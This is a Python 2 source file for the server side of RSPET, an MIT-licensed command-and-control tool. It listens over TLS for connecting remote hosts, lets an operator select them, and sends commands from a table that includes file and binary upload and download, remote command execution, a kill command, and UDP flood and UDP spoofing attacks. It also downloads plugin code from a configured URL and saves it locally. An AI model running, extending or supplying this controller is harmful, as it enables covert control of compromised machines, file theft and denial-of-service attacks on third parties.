#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
"""rspet_server.py: RSPET's Server-side script."""
from __future__ import print_function
from sys import argv
from sys import exit as sysexit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
from socket import SHUT_RDWR
import ssl
from urllib2 import urlopen
import argparse
from datetime import datetime
from thread import start_new_thread
#from threading import Thread # Will bring back at some point
import json
from Plugins.mount import Plugin
import tab


__author__ = "Kolokotronis Panagiotis"
__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
__credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas"]
__license__ = "MIT"
__version__ = "0.3.0"
__maintainer__ = "Kolokotronis Panagiotis"


class ReturnCodes(object):
    """Enumeration containing the Return Codes of the Server."""
    OK, InvalidSyntax, SocketError, LocalAccessError, RemoteAccessError = range(5)
    OutOfScope, CommandNotFound, InvalidHostID = range(5, 8)


class API(object):
    """Define RSPET Server's Api."""
    def __init__(self, max_conns, ip, port):
        """Initialize Server object."""
        self.server = Server(max_conns, ip, port)

    def call_plugin(self, command, args=[]):
        """Call a plugin command"""
        try:
            ret = self.server.execute(command, args)
        except KeyError:
            ret = [None, 6, ("%s : No such command." %command)]
        return {"transition":ret[0],
                "code":ret[1],
                "string":ret[2]}

    def select(self, args=[]):
        """Manage host selection."""
        ret = self.server.select(args)
        return {"transition":None,
                "code":ret[0],
                "string":ret[1]}

    def help(self):
        """
        Temporary. Should interface Server's help when Circular references are removed.
        """
        help_dct = {}
        for cmd in Plugin.__server_cmds__:
            help_dct[cmd] = {'help':Plugin.__server_cmds__[cmd].__doc__,
                             'syntax':Plugin.__help__[cmd],
                             'states':Plugin.__cmd_states__[cmd]}
        return help_dct

    def refresh(self):
        """Interface Server object's clean function."""
        self.server.clean()

    def get_server(self):
        """Return the instance of Server object for low level API."""
        return self.server

    def get_hosts(self):
        """Return hosts by ID."""
        host = self.server.get_hosts()
        ret = {}
        for h_id in host:
            tmp_host = host[h_id]
            ret[h_id] = {"ip":tmp_host.ip,
                         "port":tmp_host.port,
                         "version":str(tmp_host.version),
                         "type":str(tmp_host.type),
                         "system":str(tmp_host.systemtype),
                         "hostname":str(tmp_host.hostname)}
        return ret

    def quit(self):
        self.server.trash()


class Console(object):
    """Provide command line interface for the server."""
    prompt = "~$ " # Current command prompt.
    states = {} # Dictionary that defines available states.
    state = "basic" #CLI "entry" state.

    def __init__(self, max_conns, ip, port):
        """Start server and initialize states."""
        self.server = Server(max_conns, ip, port)
        #If done directly @ Class attributes, Class funcs are not recognised.
        Console.states['basic'] = Console._basic
        Console.states['connected'] = Console._connected
        Console.states['multiple'] = Console._multiple
        Console.states['all'] = Console._all

    def trash(self):
        """Delete Console."""
        self.server.trash()

    def loop(self):
        """Main CLI loop"""
        self._logo()

        while not self.server.quit_signal:
            try:
                cmd = raw_input(Console.prompt)
            except KeyboardInterrupt:
                raise KeyboardInterrupt

            cmdargs = cmd.split(" ")
            #"Sanitize" user input by stripping spaces.
            cmdargs = [x for x in cmdargs if x != ""]
            if cmdargs == []: #Check if command was empty.
                continue
            cmd = cmdargs[0]
            del cmdargs[0]
            #Execute command.
            try:
                if Console.state in Plugin.__cmd_states__[cmd]:
                    results = self.server.execute(cmd, cmdargs)
                else:
                    results = [None, 5, "Command used out of scope."]
            except KeyError:
                results = [None, 6, "Command not found. Try help for a list of all commands!"]
            tmp_state = results[0]
            #return_code = results[1] # Future use ? Also API.
            return_string = results[2]
            if return_string != "":
                print(return_string)
            try:
                Console.states[tmp_state](self) #State transition.
            except KeyError: #If none is returned make no state change.
                continue
        self.server.trash()

    def _basic(self):
        self.server.clean()
        self.server.select([])
        Console.prompt = "~$ "
        Console.state = "basic"

    def _connected(self):
        try:
            Console.prompt = "[%s]~$ " % self.server.selected[0].ip
        except IndexError:
            pass
        else:
            Console.state = "connected"

    def _multiple(self):
        if len(self.server.selected) != 0:
            Console.prompt = "[MULTIPLE]~$ "
            Console.state = "multiple"

    def _all(self):
        if len(self.server.selected) != 0:
            Console.prompt = "[ALL]~$ "
            Console.state = "multiple"

    def _logo(self):
        """Print logo and Authorship/License."""
        print(r"#####################################################")
        print(r"__________  _________________________________________")
        print(r"\______   \/   _____/\______   \_   _____/\__    ___/")
        print(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
        print(r" |    |   \/        \ |    |    |        \  |    |   ")
        print(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
        print(r"        \/        \/                   \/            ")
        print(r"")
        print(r" -Author: panagiks (http://panagiks.xyz)")
        print(r" -Co-Author: dzervas (http://dzervas.gr)")
        print(r" -Licence: MIT @ panagiks")
        print(r"#####################################################")
        print(r"")


class Server(object):
    """Main class of the server. Manage server socket, selections and call plugins."""
    #hosts = [] # List of hosts
    #selected = [] # List of selected hosts
    #plugins = [] # List of active plugins
    #config = {} # Reserved for future use (dynamic plug-in loading).

    def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
        """Start listening on socket."""
        ################## Replace with dict named connection. #################
        self.ip = ip
        self.port = port
        self.max_conns = max_conns
        self.sock = socket(AF_INET, SOCK_STREAM)
        ########################################################################
        self.quit_signal = False
        ################### Replace with dict named clients. ###################
        self.hosts = {} # Dictionary of hosts
        self.selected = [] # List of selected hosts
        self.serial = 0
        ########################################################################
        self.log_opt = [] # List of Letters. Indicates logging level
        #################### Replaced with dict named plugins ###################
        self.plugins = {}
        self.plugins["loaded"] = [] # List of loaded plugins
        self.plugins["installed"] = self.installed_plugins() # List of installed plugins
        self.plugins["available"] = [] # List of available plugins
        self.plugins["base_url"] = ""
        ########################################################################

        with open("config.json") as json_config:
            self.config = json.load(json_config)
        self.log_opt = self.config["log"]
        self.plugins["base_url"] = self.config["plugin_base_url"]
        self._log("L", "Session Start.")
        for plugin in self.config["plugins"]:
            self.load_plugin(plugin)
        try:
            self.sock.bind((ip, int(port)))
            self.sock.listen(max_conns)
            self._log("L", "Socket bound @ %s:%s." %(self.ip, self.port))
        except sock_error:
            print("Something went wrong during binding & listening")
            self._log("E", "Error binding socket @ %s:%s." %(self.ip, self.port))
            sysexit()
        start_new_thread(self.loop, ())

    def trash(self):
        """Safely closes all sockets"""
        for host in self.hosts:
            self.hosts[host].trash()
        self.clean()
        self.select([])
        self.sock.close()

    def _log(self, level, action):
        if level not in self.log_opt:
            return
        timestamp = datetime.now()
        with open("log.txt", 'a') as logfile:
            logfile.write("%s : [%s/%s/%s %s:%s:%s] => %s\n" %(level,
                                                               str(timestamp.day),
                                                               str(timestamp.month),
                                                               str(timestamp.year),
                                                               str(timestamp.hour),
                                                               str(timestamp.minute),
                                                               str(timestamp.second),
                                                               action))

    def loop(self):
        """Main server loop for accepting connections. Better call it on its own thread"""
        while True:
            try:
                (csock, (ip, port)) = self.sock.accept()
                self._log("L", "New connection from %s:%s" % (str(ip),
                                                              str(port)))
            except sock_error:
                raise sock_error
            try:
                csock = ssl.wrap_socket(csock, server_side=True, certfile="server.crt",
                                        keyfile="server.key",
                                        ssl_version=ssl.PROTOCOL_TLSv1_2)
            except AttributeError: # All PROTOCOL consts are merged on TLS in Python2.7.13
                csock = ssl.wrap_socket(csock, server_side=True, certfile="server.crt",
                                        keyfile="server.key",
                                        ssl_version=ssl.PROTOCOL_TLS)
            self.hosts[str(self.serial)] = Host(csock, ip, port, self.serial)
            self.serial += 1

    def load_plugin(self, plugin):
        if plugin in self.plugins["installed"]:
            try:
                __import__("Plugins.%s" % plugin)
                self._log("L", "%s: plugin loaded." % plugin)
                self.plugins["loaded"].append(plugin)
            except ImportError:
                self._log("E", "%s: plugin failed to load." % plugin)
        else:
            self._log("E", "%s: plugin not installed" % plugin)

    def install_plugin(self, plugin):
        official_plugins = self.available_plugins()
        try:
            plugin_url = self.plugins["base_url"] + official_plugins[plugin]
        except KeyError:
            self._log("E", "%s: plugin does not exist" % plugin)
        else:
            plugin_obj = urlopen(plugin_url)
            plugin_cont = plugin_obj.read()
            with open(("Plugins/%s.py" %plugin),'w') as plugin_file:
                plugin_file.write(plugin_cont)
            self._log("L", "%s: plugin installed" % plugin)

    def available_plugins(self):
        json_file = urlopen(self.plugins["base_url"] + '/plugins.json')
        self.plugins["available"] = json.load(json_file)
        return self.plugins["available"]

    def installed_plugins(self):
        from os import listdir
        from fnmatch import fnmatch
        files = listdir('Plugins')
        plugins = []
        for element in files:
            if fnmatch(element,'*.py') and not fnmatch(element,'_*'):
                plugins.append(element[:-3]) # Remove .py
        try:
            plugins.remove('mount')
            plugins.remove('template')
        except ValueError:
            pass
        return plugins

    def select(self, ids=None):
        """Selects given host(s) based on ids

        Keyword argument:
        ids     -- Array of ids of hosts. Empty array unselects all. None
        selects all
        """
        ret = [0, ""]
        flag = False
        self.selected = []
        if ids is None:
            for h_id in self.hosts:
                self.selected.append(self.hosts[h_id])
        else:
            #self.selected = []
            for i in ids:
                i = str(i)
                try:
                    if self.hosts[i] not in self.selected:
                        self.selected.append(self.hosts[i])
                except KeyError:
                    flag = True
        if flag:
            ret[0] = 7
            ret[1] = "One or more host IDs were invalid. Continuing with valid hosts ..."
        return ret

    def get_selected(self):
        """
        Interface function. Return selected hosts.
        """
        return self.selected

    def get_hosts(self):
        """
        Interface function. Return all hosts.
        """
        return self.hosts

    def execute(self, cmd, args):
        """Execute a command on all selected clients.

        Keyword argument:
        cmd     -- Function to call for each selected host.
        Function signature myfunc(Host, args[0], args[1], ...)
        It should accept len(args) - 1 arguments
        args    -- Arguments to pass to the command function"""

        ret = [None, 0, ""]
        try:
            ret = Plugin.__server_cmds__[cmd](self, args)
        except KeyError:
            raise KeyError
        return ret

    def help(self, args):
        """Print all the commands available in the current interface allong with
        their docsting."""
        help_str = ""
        if len(args) == 0:
            help_str += "Server commands:"
            if Plugin.__server_cmds__ is not None:
                for cmd in Plugin.__server_cmds__:
                    if Console.state in Plugin.__cmd_states__[cmd]:
                        help_str += ("\n\t%s: %s"\
                                     % (cmd, Plugin.__server_cmds__[cmd].__doc__))
        else:
            help_str += ("Command : %s" % args[0])
            try:
                help_str += ("\nSyntax : %s" % Plugin.__help__[args[0]])
            except KeyError:
                help_str += "\nCommand not found! Try help with no arguments for\
                             a list of all commands available in current scope."
        return help_str

    def clean(self):
        """Remove hosts tagged for deletion."""
        tmp_dct = {}
        for host_id in self.hosts:
            if not self.hosts[host_id].deleteme:
                #self.hosts.pop(host_id)
                tmp_dct[host_id] = self.hosts[host_id]
            elif self.hosts[host_id] in self.selected:
                self.selected.remove(self.hosts[host_id])
        self.hosts = tmp_dct
        #self.hosts = [a for a in self.hosts if a is not None]
        #self.select([])

    def quit(self):
        """
        Interface function. Raise a Quit signal.
        """
        self.quit_signal = True

class Host(object):
    """Class for hosts. Each Host object represent one host"""
    command_dict = {
        'killMe'     : '00000',
        'getFile'    : '00001',
        'getBinary'  : '00002',
        'sendFile'   : '00003',
        'sendBinary' : '00004',
        'udpFlood'   : '00005',
        'udpSpoof'   : '00006',
        'command'    : '00007',
        'KILL'       : '00008'
    }

    def __init__(self, sock, ip, port, h_id):
        """Accept the connection and initialize variables."""
        self.deleteme = False
        self.sock = sock
        self.ip = ip
        self.port = port
        self.id = h_id

        try:
            ###Get Version###
            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
            tmp = self.recv(int(msg_len)).split("-")
            self.version = tmp[0]
            self.type = tmp[1]
            #################
            ###Get System Type###
            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
            self.systemtype = self.recv(int(msg_len))
            #####################
            ###Get Hostname###
            msg_len = self.recv(2) # len is 2-digit (i.e. up to 99 chars)
            self.hostname = self.recv(int(msg_len))
            ##################
        except sock_error:
            self.trash()

    def trash(self):
        """Gracefully delete host."""
        if not self.deleteme:
            try:
                self.send(Host.command_dict['killMe'])
            except sock_error:
                pass
            self.purge()

    def purge(self):
        """Delete host not so gracefully."""
        self.sock.shutdown(SHUT_RDWR)
        self.sock.close()
        self.deleteme = True

    def __eq__(self, other):
        """Check weather two sockets are the same socket."""
        #Why is this here ?
        return self.sock == other.sock

    def send(self, msg):
        """Send message to host"""
        if msg is not None and len(msg) > 0:
            try:
                self.sock.send(msg)
            except sock_error:
                raise sock_error

    def recv(self, size=1024):
        """Receive from host"""
        if size > 0:
            data = self.sock.recv(size)
            if data == '':
                raise sock_error
            return data


def main():
    """Main function."""
    parser = argparse.ArgumentParser(description='RSPET Server module.')
    parser.add_argument("-c", "--clients", nargs=1, type=int, metavar='N',
                        help="Number of clients to accept.", default=[5])
    parser.add_argument("--ip", nargs=1, type=str, metavar='IP',
                        help="IP to listen for incoming connections.",
                        default=["0.0.0.0"])
    parser.add_argument("-p", "--port", nargs=1, type=int, metavar='PORT',
                        help="Port number to listen for incoming connections.",
                        default=[9000])
    args = parser.parse_args()
    cli = Console(args.clients[0], args.ip[0], args.port[0])
    try:
        cli.loop()
    except KeyError:
        print("Got KeyError")
        cli.trash()
        del cli
        sysexit()
    except KeyboardInterrupt:
        cli.trash()
        del cli
        sysexit()
    cli.trash()
    del cli


if __name__ == "__main__":
    main()
